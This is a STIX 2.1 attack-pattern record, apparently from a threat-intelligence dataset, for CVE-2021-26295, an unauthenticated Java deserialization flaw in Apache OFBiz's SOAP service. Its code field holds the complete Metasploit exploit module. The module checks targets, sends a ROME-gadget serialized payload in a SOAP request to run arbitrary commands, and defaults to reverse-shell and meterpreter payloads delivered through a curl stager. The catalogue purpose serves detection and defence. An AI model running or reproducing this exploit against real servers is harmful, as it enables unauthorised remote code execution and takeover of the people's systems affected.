{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--728384c5-5c66-4a0f-be7d-5f8b67f4536f",
    "created": "2024-08-14T17:00:54.630638Z",
    "modified": "2024-08-14T17:00:54.630652Z",
    "name": "Apache OFBiz SOAP Java Deserialization",
    "description": " This module exploits a Java deserialization vulnerability in Apache OFBiz's unauthenticated SOAP endpoint /webtools/control/SOAPService for versions prior to 17.12.06. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/apache_ofbiz_deserialization_soap.rb",
            "external_id": "apache_ofbiz_deserialization_soap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-26295"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/yumusb/CVE-2021-26295-POC/blob/main/poc.py"
        },
        {
            "source_name": "reference",
            "url": "https://issues.apache.org/jira/browse/OFBIZ-12167"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::JavaDeserialization\n\n  XML_NS = {\n    'serResponse' => 'http://ofbiz.apache.org/service/',\n    'soapenv' => 'http://schemas.xmlsoap.org/soap/envelope/'\n  }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache OFBiz SOAP Java Deserialization',\n        'Description' => %q{\n          This module exploits a Java deserialization vulnerability in Apache\n          OFBiz's unauthenticated SOAP endpoint /webtools/control/SOAPService for\n          versions prior to 17.12.06.\n        },\n        'Author' => [\n          'yumusb',           # original PoC\n          'Spencer McIntyre', # metasploit module\n          'wvu'               # metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2021-26295' ],\n          [ 'URL', 'https://github.com/yumusb/CVE-2021-26295-POC/blob/main/poc.py' ],\n          [ 'URL', 'https://issues.apache.org/jira/browse/OFBIZ-12167' ]\n        ],\n        'DisclosureDate' => '2021-03-22', # NVD publish date\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python_ssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :curl,\n                'PAYLOAD' => 'linux/x64/meterpreter_reverse_https'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8443),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    # Send an empty serialized object\n    res = send_request_soap('')\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    messages = {}\n    res.get_xml_document.xpath('//soapenv:Envelope/soapenv:Body/serResponse:serResponse/serResponse:map-HashMap/serResponse:map-Entry', XML_NS).each do |entry|\n      key = entry.xpath('serResponse:map-Key/serResponse:std-String/@value', XML_NS).to_s\n      messages[key] = entry.xpath('serResponse:map-Value/serResponse:std-String/@value', XML_NS).to_s\n    end\n\n    if messages['errorMessage']&.start_with?('Problem deserializing object from byte array')\n      return CheckCode::Vulnerable('Target can deserialize arbitrary data.')\n    end\n\n    CheckCode::Safe('Target cannot deserialize arbitrary data.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    res = send_request_soap(\n      # framework/webapp/lib/rome-0.9.jar\n      generate_java_deserialization_for_command('ROME', 'bash', cmd)\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Failed to execute command: #{cmd}\")\n    end\n\n    print_good(\"Successfully executed command: #{cmd}\")\n  end\n\n  def send_request_soap(data)\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/webtools/control/SOAPService'),\n      'ctype' => 'text/xml',\n      'data' => <<~XML\n        <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n          <soapenv:Header/>\n          <soapenv:Body>\n            <ser>\n              <map-HashMap>\n                <map-Entry>\n                  <map-Key>\n                    <cus-obj>#{Rex::Text.to_hex(data, '')}</cus-obj>\n                  </map-Key>\n                  <map-Value>\n                    <std-String value=\"http://#{Faker::Internet.domain_name}\"/>\n                  </map-Value>\n                </map-Entry>\n              </map-HashMap>\n            </ser>\n          </soapenv:Body>\n        </soapenv:Envelope>\n      XML\n    )\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-03-22, # NVD publish date",
    "x_mitre_platforms": [
        "linux'"
    ]
}